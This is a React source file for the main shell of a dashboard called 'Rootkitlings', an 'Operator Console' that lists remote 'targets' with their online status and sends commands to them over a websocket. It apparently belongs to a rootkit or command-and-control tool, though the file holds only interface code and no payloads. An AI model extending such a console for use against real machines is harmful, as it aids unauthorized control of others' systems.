import { useState, useEffect, useCallback } from 'react'
import { Menu, LayoutDashboard, Activity, Radio, Wifi, WifiOff, PanelLeftClose, PanelLeftOpen } from 'lucide-react'
import { useWs } from './hooks/useWs'
import { ToastProvider, useToast } from './components/Toast'
import { Home } from './pages/Home'
import { Target } from './pages/Target'
import { Events } from './pages/Events'

export default function App() {
  return (
    <ToastProvider>
      <Shell />
    </ToastProvider>
  )
}

function Shell() {
  const { targets, events, log, connected, sendCmd, query, refresh } = useWs()
  const { toast } = useToast()
  const [page, setPage] = useState({ view: 'home', targetId: null })
  const [collapsed, setCollapsed] = useState(false)

  const sendCmdWithToast = useCallback((cmd, targetId) => {
    toast(`Sent: ${cmd}`, 'info', 2000)
    sendCmd(cmd, targetId)
  }, [sendCmd, toast])

  useEffect(() => {
    document.documentElement.setAttribute('data-theme', 'light')
  }, [])

  useEffect(() => {
    const handler = () => {
      const hash = location.hash || '#/'
      const m = hash.match(/^#\/target\/(.+)$/)
      if (m) setPage({ view: 'target', targetId: decodeURIComponent(m[1]) })
      else if (hash === '#/events') setPage({ view: 'events', targetId: null })
      else setPage({ view: 'home', targetId: null })
    }
    window.addEventListener('hashchange', handler)
    handler()
    return () => window.removeEventListener('hashchange', handler)
  }, [])

  const navigate = (hash) => { location.hash = hash }
  const selectedTarget = targets.find(t => t.id === page.targetId)
  const online = targets.filter(t => t.online).length

  return (
    <div className="flex h-screen overflow-hidden bg-bg">
      {/* Sidebar: full or icon-only */}
      <aside className={`${collapsed ? 'w-14' : 'w-52'} shrink-0 border-r-2 border-border bg-secondary flex flex-col transition-all duration-200`}>
        {/* Logo */}
        <div className={`flex items-center gap-2 border-b-2 border-border ${collapsed ? 'px-2 py-3 justify-center' : 'px-3 py-3'}`}>
          <div className="w-8 h-8 bg-main rounded-[var(--radius)] flex items-center justify-center border-2 border-border shadow-[2px_2px_0px_0px_var(--color-border)] shrink-0">
            <Radio size={14} className="text-main-fg" />
          </div>
          {!collapsed && <span className="font-bold text-sm tracking-tight">Rootkitlings</span>}
        </div>

        {/* Nav */}
        <nav className="p-1.5 space-y-0.5">
          <NavItem icon={LayoutDashboard} label="Dashboard" active={page.view === 'home'} collapsed={collapsed} onClick={() => navigate('#/')} />
          <NavItem icon={Activity} label="Events" active={page.view === 'events'} collapsed={collapsed} onClick={() => navigate('#/events')} />
        </nav>

        {/* Targets */}
        <div className={`flex-1 overflow-auto ${collapsed ? 'px-1.5' : 'px-3'} py-2`}>
          {!collapsed && <div className="text-[9px] font-bold uppercase tracking-widest text-fg-3 mb-1.5 px-1">Targets</div>}
          <div className="space-y-0.5">
            {targets.map(t => (
              <button
                key={t.id}
                title={collapsed ? ((t.hostname && t.hostname !== '(none)') ? t.hostname : t.id) : undefined}
                className={`w-full flex items-center gap-2 text-sm text-left rounded-[var(--radius)] border-2 transition-all
                  ${collapsed ? 'p-1.5 justify-center' : 'px-2 py-1.5'}
                  ${page.targetId === t.id
                    ? 'bg-main text-main-fg border-border font-bold shadow-[2px_2px_0px_0px_var(--color-border)]'
                    : 'border-transparent hover:border-border hover:bg-bg-2'}`}
                onClick={() => navigate(`#/target/${encodeURIComponent(t.id)}`)}
              >
                <span className={`w-2 h-2 rounded-full shrink-0 ${t.online ? 'bg-green pulse' : 'bg-red'}`} />
                {!collapsed && <>
                  <span className="truncate">{(t.hostname && t.hostname !== '(none)') ? t.hostname : t.id}</span>
                </>}
              </button>
            ))}
          </div>
        </div>

        {/* Footer */}
        <div className={`border-t-2 border-border ${collapsed ? 'p-1.5' : 'px-3 py-2'}`}>
          <button
            className="w-full flex items-center justify-center p-1.5 rounded-[var(--radius)] hover:bg-bg-2 transition-colors text-fg-3"
            onClick={() => setCollapsed(!collapsed)}
            title={collapsed ? 'Expand sidebar' : 'Collapse sidebar'}
          >
            {collapsed ? <PanelLeftOpen size={14} /> : <PanelLeftClose size={14} />}
          </button>
          <div className={`flex items-center gap-1.5 text-[10px] font-bold mt-1 ${connected ? 'text-green' : 'text-red'} ${collapsed ? 'justify-center' : 'px-1'}`}>
            {connected ? <Wifi size={10} /> : <WifiOff size={10} />}
            {!collapsed && (connected ? 'Connected' : 'Disconnected')}
          </div>
        </div>
      </aside>

      {/* Main */}
      <div className="flex-1 flex flex-col min-w-0">
        <header className="flex items-center justify-between px-4 py-1.5 border-b-2 border-border bg-secondary">
          <span className="text-[10px] font-bold text-fg-3 uppercase tracking-widest">Operator Console</span>
          <div className="flex items-center gap-2">
            <span className="text-[10px] font-mono text-fg-3">{online}/{targets.length} online</span>
            <div className={`nb-badge text-[9px] py-0.5 ${connected ? 'bg-green text-white' : 'bg-red text-white'}`}>
              <span className={`w-1.5 h-1.5 rounded-full bg-current ${connected ? 'pulse' : ''}`} />
              {connected ? 'LIVE' : 'OFFLINE'}
            </div>
          </div>
        </header>

        <main className="flex-1 overflow-auto bg-bg">
          {page.view === 'home' && (
            <Home targets={targets} onNavigate={id => navigate(`#/target/${id}`)} onRefresh={refresh} />
          )}
          {page.view === 'target' && (
            <Target target={selectedTarget} log={log} events={events} sendCmd={sendCmdWithToast} query={query} onBack={() => navigate('#/')} />
          )}
          {page.view === 'events' && (
            <Events events={events} onRefresh={refresh} />
          )}
        </main>
      </div>
    </div>
  )
}

function NavItem({ icon: Icon, label, active, collapsed, onClick }) {
  return (
    <button
      title={collapsed ? label : undefined}
      className={`w-full flex items-center gap-2 text-sm font-semibold rounded-[var(--radius)] border-2 transition-all
        ${collapsed ? 'p-1.5 justify-center' : 'px-2.5 py-1.5'}
        ${active
          ? 'bg-main text-main-fg border-border shadow-[2px_2px_0px_0px_var(--color-border)]'
          : 'border-transparent hover:border-border hover:bg-bg-2'}`}
      onClick={onClick}
    >
      <Icon size={16} />
      {!collapsed && label}
    </button>
  )
}
